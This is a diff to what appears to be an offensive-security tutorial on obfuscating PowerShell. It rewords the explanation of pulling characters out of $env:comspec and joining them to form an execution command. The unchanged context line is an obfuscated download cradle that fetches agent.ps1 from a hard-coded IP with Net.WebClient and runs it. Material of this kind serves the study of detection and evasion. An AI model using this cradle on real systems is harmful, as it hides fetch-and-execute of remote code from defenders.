@@ -130,8 +130,8 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 
 ![powershell obfuscation](http://i.cubeupload.com/uDdG3G.jpg)
 
-- Using **$env:comspec** (powershell local variable) and **-Join''** to pull out the 4º,15º and 25º characters from
-$env:comspec powershell local var and uses the **-Join''** operator to take the arraw and convert it to a string.
+- Using **$env:comspec** (powershell/windows enviroment variable) and **-Join''** to pull out the 4º,15º and 25º
+characters from $env:comspec variable and uses the **-Join''** operator to take the arraw and convert it to a string.
 
       $env:comspec[4,15,25]-Join'' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')
 
